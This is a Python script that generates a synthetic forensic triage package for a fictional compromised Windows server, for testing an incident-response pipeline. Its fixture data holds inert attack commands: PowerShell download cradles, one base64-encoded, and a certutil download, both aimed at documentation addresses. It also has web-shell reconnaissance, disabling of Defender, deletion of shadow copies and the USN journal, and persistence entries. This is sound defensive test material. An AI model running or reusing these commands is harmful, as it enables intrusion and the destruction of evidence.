"""Build a sample collection package, exactly as the live collector would emit one.

Represents a fast live triage of a compromised host (WEB-03): processes, network
connections, local users, registry persistence, and recent events — plus a
manifest with a SHA-256 for every file. Lets the whole collect -> verify ->
analyze pipeline be exercised end-to-end without a real endpoint.

Run:  python examples/make_sample_collection.py
"""

import base64
import hashlib
import json
from pathlib import Path

OUT = Path(__file__).resolve().parent / "sample-collection"
HOST = "WEB-03"
C2 = "203.0.113.45"
# RFC 5737 documentation ranges used for the (inert) download cradles below.
DOC_IP_A = "198.51.100.23"   # TEST-NET-2
DOC_IP_B = "198.51.100.50"


def _enc_ps(script: str) -> str:
    """PowerShell -EncodedCommand encoding: UTF-16LE then base64 (inert, synthetic)."""
    return base64.b64encode(script.encode("utf-16-le")).decode("ascii")


# A benign, documentation-range download cradle — exactly what -EncodedCommand
# hides in a real intrusion, but pointed at an RFC 5737 address and never run.
CRADLE_PLAINTEXT = (f"IEX (New-Object Net.WebClient).DownloadString('http://{DOC_IP_A}/stage.ps1')")
CRADLE_B64 = _enc_ps(CRADLE_PLAINTEXT)

PROCESSES = [
    {"pid": 700, "ppid": 660, "name": "explorer.exe", "path": "C:\\Windows\\explorer.exe",
     "cmdline": "explorer.exe", "user": "WEB-03\\jdoe", "created": "2026-05-02T08:00:00Z", "hash": ""},
    {"pid": 2104, "ppid": 700, "name": "powershell.exe",
     "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
     "cmdline": "powershell -nop -w hidden -enc SQBFAFgA", "user": "WEB-03\\jdoe",
     "created": "2026-05-02T09:12:00Z", "hash": ""},
    {"pid": 3320, "ppid": 2104, "name": "svchost.exe", "path": "C:\\Users\\Public\\svchost.exe",
     "cmdline": "C:\\Users\\Public\\svchost.exe", "user": "WEB-03\\jdoe",
     "created": "2026-05-02T09:12:30Z", "hash": "9F2A...SHA256"},
    {"pid": 4480, "ppid": 3320, "name": "rundll32.exe", "path": "C:\\Windows\\System32\\rundll32.exe",
     "cmdline": "rundll32.exe C:\\Users\\Public\\d.dll,Run", "user": "WEB-03\\jdoe",
     "created": "2026-05-02T09:14:00Z", "hash": ""},
]

NETWORK = [
    {"proto": "tcp", "local": "10.0.2.40:50112", "remote": f"{C2}:443", "state": "Established",
     "pid": 3320, "process": "svchost.exe"},
    {"proto": "tcp", "local": "10.0.2.40:50120", "remote": "10.0.0.5:443", "state": "Established",
     "pid": 980, "process": "chrome.exe"},
]

USERS = [
    {"name": "jdoe", "enabled": True, "last_logon": "2026-05-02T08:00:00Z", "groups": ""},
    {"name": "supportadmin", "enabled": True, "last_logon": "", "groups": "Administrators"},
]

SERVICES = [
    {"name": "FakeSvc", "display": "Windows Update Helper", "path": "C:\\Windows\\Temp\\f.exe",
     "start": "Auto", "state": "Running", "account": "LocalSystem"},
]

PROGRAMS = [
    {"name": "svchost.exe", "path": "C:\\Users\\Public\\svchost.exe",
     "sha1": "A94A8FE5CCB19BA61C4C0873D391E987982FBBD3", "first_run": "2026-05-02T09:12:30Z"},
    {"name": "f.exe", "path": "C:\\Windows\\Temp\\f.exe",
     "sha1": "DA39A3EE5E6B4B0D3255BFEF95601890AFD80709", "first_run": "2026-05-02T09:13:00Z"},
]

REGISTRY = [
    {"hive": "HKLM", "key": "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
     "value_name": "Updater", "value_data": "C:\\Users\\Public\\svchost.exe",
     "last_write": "", "category": "run"},
    {"hive": "HKLM", "key": "SYSTEM\\CurrentControlSet\\Services\\FakeSvc",
     "value_name": "ImagePath", "value_data": "C:\\Windows\\Temp\\f.exe", "last_write": "", "category": "service"},
    {"hive": "HKLM", "key": "SOFTWARE\\Policies\\Microsoft\\Windows Defender",
     "value_name": "DisableAntiSpyware", "value_data": "1", "last_write": "", "category": "other"},
    {"hive": "HKLM", "key": "Disk&Ven_SanDisk&Prod_Ultra",
     "value_name": "FriendlyName", "value_data": "SanDisk Ultra USB Device", "last_write": "", "category": "usbstor"},
]


def e(ts, eid, detail, **kw):
    base = {"ts": ts, "event_id": eid, "channel": "Security", "computer": HOST,
            "user": "", "process": "", "parent_process": "", "cmdline": "", "dst_ip": "", "detail": detail}
    base.update(kw)
    return base


EVENTS = [
    # --- delivery + execution (the original download+exec story) -------------
    e("2026-05-02T09:10:30Z", 4688, "certutil URLCache download", process="certutil.exe",
      cmdline=f"certutil.exe -urlcache -split -f http://{DOC_IP_A}/p.exe C:\\Users\\Public\\p.exe"),
    e("2026-05-02T09:11:00Z", 4688, "encoded PowerShell download cradle", process="powershell.exe",
      cmdline=f"powershell.exe -nop -w hidden -ep bypass -enc {CRADLE_B64}"),
    e("2026-05-02T09:11:05Z", 4104,
      f"ScriptBlock: {CRADLE_PLAINTEXT}", channel="Microsoft-Windows-PowerShell/Operational"),
    e("2026-05-02T09:11:30Z", 4688, "IIS worker spawned a shell (web shell)", process="cmd.exe",
      parent_process="w3wp.exe", cmdline="cmd.exe /c whoami & net user"),
    e("2026-05-02T09:12:00Z", 4688, "encoded PowerShell", process="powershell.exe",
      cmdline="powershell -nop -w hidden -enc SQBFAFgA"),
    e("2026-05-02T09:12:05Z", 4104, "ScriptBlock: IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.45/a')",
      channel="Microsoft-Windows-PowerShell/Operational"),
    e("2026-05-02T09:13:00Z", 7045, "A new service was installed: FakeSvc"),
    e("2026-05-02T09:14:00Z", 4688, "proxied execution", process="rundll32.exe",
      cmdline="rundll32.exe C:\\Users\\Public\\d.dll,Run"),
    e("2026-05-02T09:16:00Z", 4720, "A user account was created: supportadmin"),
    e("2026-05-02T09:18:00Z", 4698, "Scheduled task created: \\Updater -> C:\\Users\\Public\\svchost.exe"),
    e("2026-05-02T09:25:00Z", 6416, "external device recognized: USBSTOR"),
    # --- anti-forensics: disable defenses, destroy recovery + journals -------
    e("2026-05-02T09:38:00Z", 4688, "Defender real-time monitoring disabled", process="powershell.exe",
      cmdline="powershell -Command Set-MpPreference -DisableRealtimeMonitoring $true"),
    e("2026-05-02T09:38:30Z", 4688, "shadow copies deleted", process="vssadmin.exe",
      cmdline="vssadmin.exe delete shadows /all /quiet"),
    e("2026-05-02T09:39:00Z", 4688, "USN change journal deleted", process="fsutil.exe",
      cmdline="fsutil usn deletejournal /D C:"),
    e("2026-05-02T09:40:00Z", 1102, "The audit log was cleared"),
]

# --- deeper forensic sources (each corroborates the same kill chain) ---------
# Delivery: a masqueraded "svchost.exe" pulled through the browser at 09:10,
# written to disk (MFT), copied into C:\Users\Public, then executed (prefetch +
# shimcache) and made persistent via a WMI subscription.  All hosts/URLs are
# RFC 5737 / RFC 2606 reserved for documentation.
BROWSER = [
    {"type": "visit", "url": "http://intranet.example.test/portal", "title": "Corp Portal",
     "timestamp": "2026-05-02T08:30:00Z", "target_path": "", "browser": "Chrome"},
    {"type": "visit", "url": "http://cdn.example-update.test/", "title": "Software Update",
     "timestamp": "2026-05-02T09:09:40Z", "target_path": "", "browser": "Chrome"},
    {"type": "download", "url": "http://cdn.example-update.test/svchost.exe", "title": "svchost.exe",
     "timestamp": "2026-05-02T09:10:00Z", "target_path": "C:\\Users\\jdoe\\Downloads\\svchost.exe",
     "browser": "Chrome"},
]

FILESYSTEM = [
    {"path": "C:\\Users\\jdoe\\Documents\\notes.txt", "name": "notes.txt",
     "created": "2026-04-28T14:02:00Z", "modified": "2026-05-01T17:10:00Z",
     "mft_modified": "2026-05-01T17:10:00Z", "size": 840, "is_directory": False},
    {"path": "C:\\Users\\jdoe\\Downloads\\svchost.exe", "name": "svchost.exe",
     "created": "2026-05-02T09:10:05Z", "modified": "2026-05-02T09:10:05Z",
     "mft_modified": "2026-05-02T09:10:05Z", "size": 73216, "is_directory": False},
    {"path": "C:\\Users\\Public\\svchost.exe", "name": "svchost.exe",
     "created": "2026-05-02T09:11:50Z", "modified": "2026-05-02T09:11:50Z",
     "mft_modified": "2026-05-02T09:11:50Z", "size": 73216, "is_directory": False},
    {"path": "C:\\Windows\\Temp\\f.exe", "name": "f.exe",
     "created": "2026-05-02T09:12:50Z", "modified": "2026-05-02T09:12:50Z",
     "mft_modified": "2026-05-02T09:12:50Z", "size": 51200, "is_directory": False},
    {"path": "C:\\Users\\Public\\d.dll", "name": "d.dll",
     "created": "2026-05-02T09:13:40Z", "modified": "2026-05-02T09:13:40Z",
     "mft_modified": "2026-05-02T09:13:40Z", "size": 18944, "is_directory": False},
    # Timestomped implant: SI (0x10) creation backdated to look like an OS driver,
    # but FN (0x30) — set when the record was created — shows the real drop time.
    # SI-created < FN-created is impossible naturally, so this is a clear timestomp.
    {"path": "C:\\Windows\\System32\\drivers\\update.sys", "name": "update.sys",
     "created": "2009-07-14T01:14:24Z", "modified": "2009-07-14T01:14:24Z",
     "mft_modified": "2026-05-02T09:13:10Z",
     "fn_created": "2026-05-02T09:13:00Z", "fn_modified": "2026-05-02T09:13:00Z",
     "fn_record_change": "2026-05-02T09:13:10Z",
     "size": 24576, "is_directory": False, "deleted": False},
    # Deleted second-stage dropper: the $MFT record is no longer in use (InUse=false)
    # — the attacker deleted it, but the record survives for recovery.
    {"path": "C:\\Users\\Public\\stage2.exe", "name": "stage2.exe",
     "created": "2026-05-02T09:15:00Z", "modified": "2026-05-02T09:15:00Z",
     "mft_modified": "2026-05-02T09:15:30Z",
     "fn_created": "2026-05-02T09:15:00Z", "fn_modified": "2026-05-02T09:15:00Z",
     "fn_record_change": "2026-05-02T09:15:30Z",
     "size": 40960, "is_directory": False, "deleted": True},
]

PREFETCH = [
    {"name": "svchost.exe", "path": "C:\\Users\\Public\\svchost.exe", "run_count": 3,
     "last_run": "2026-05-02T09:30:00Z", "first_run": "2026-05-02T09:12:30Z",
     "prefetch_file": "SVCHOST.EXE-1A2B3C4D.pf"},
    {"name": "f.exe", "path": "C:\\Windows\\Temp\\f.exe", "run_count": 1,
     "last_run": "2026-05-02T09:13:00Z", "first_run": "2026-05-02T09:13:00Z",
     "prefetch_file": "F.EXE-5E6F7A8B.pf"},
    {"name": "rundll32.exe", "path": "C:\\Windows\\System32\\rundll32.exe", "run_count": 1,
     "last_run": "2026-05-02T09:14:00Z", "first_run": "2026-05-02T09:14:00Z",
     "prefetch_file": "RUNDLL32.EXE-9C0D1E2F.pf"},
    {"name": "powershell.exe", "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
     "run_count": 4, "last_run": "2026-05-02T09:12:00Z", "first_run": "2026-04-30T08:00:00Z",
     "prefetch_file": "POWERSHELL.EXE-AB12CD34.pf"},
]

SHIMCACHE = [
    {"position": 1, "name": "svchost.exe", "path": "C:\\Users\\Public\\svchost.exe",
     "last_modified": "2026-05-02T09:11:50Z", "executed": True,
     "sha1": "A94A8FE5CCB19BA61C4C0873D391E987982FBBD3"},
    {"position": 2, "name": "f.exe", "path": "C:\\Windows\\Temp\\f.exe",
     "last_modified": "2026-05-02T09:12:50Z", "executed": True,
     "sha1": "DA39A3EE5E6B4B0D3255BFEF95601890AFD80709"},
    {"position": 3, "name": "rundll32.exe", "path": "C:\\Windows\\System32\\rundll32.exe",
     "last_modified": "2025-10-14T00:00:00Z", "executed": True, "sha1": ""},
    {"position": 4, "name": "cmd.exe", "path": "C:\\Windows\\System32\\cmd.exe",
     "last_modified": "2025-10-14T00:00:00Z", "executed": False, "sha1": ""},
]

WMI = [
    {"filter_name": "WinUpdateFilter", "consumer_name": "WinUpdateConsumer",
     "consumer_type": "CommandLineEventConsumer",
     "query": "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE "
              "TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'",
     "command": "C:\\Users\\Public\\svchost.exe"},
]

FILES = {
    "events.json": EVENTS, "registry.json": REGISTRY, "processes.json": PROCESSES,
    "network.json": NETWORK, "users.json": USERS, "services.json": SERVICES,
    "programs.json": PROGRAMS, "prefetch.json": PREFETCH, "shimcache.json": SHIMCACHE,
    "filesystem.json": FILESYSTEM, "browser.json": BROWSER, "wmi.json": WMI,
}


def _write(path: Path, text: str) -> None:
    # Always write LF (newline="\n" suppresses the platform translation), so the
    # bytes — and therefore the SHA-256s in the manifest — are identical on every
    # OS. Paired with the `-text` .gitattributes rule, custody survives checkout.
    path.write_text(text, encoding="utf-8", newline="\n")


def main():
    OUT.mkdir(parents=True, exist_ok=True)
    entries = []
    for name, data in FILES.items():
        path = OUT / name
        _write(path, json.dumps(data, indent=2))
        sha = hashlib.sha256(path.read_bytes()).hexdigest().upper()
        entries.append({"name": name, "sha256": sha, "count": len(data)})
    manifest = {
        "case_id": "IR-2026-031", "operator": "T.Nelson", "collector_version": "1.0.0",
        "profile": "quick",
        "host": {"computer": HOST, "os": "Windows Server 2022",
                 "boot_time": "2026-05-01T22:00:00Z", "current_user": "WEB-03\\jdoe",
                 "collected_at": "2026-05-02T10:05:00Z"},
        "collected_at": "2026-05-02T10:05:00Z", "files": entries,
    }
    _write(OUT / "manifest.json", json.dumps(manifest, indent=2))
    print(f"wrote sample collection package -> {OUT} ({len(entries)} artifact files)")


if __name__ == "__main__":
    main()
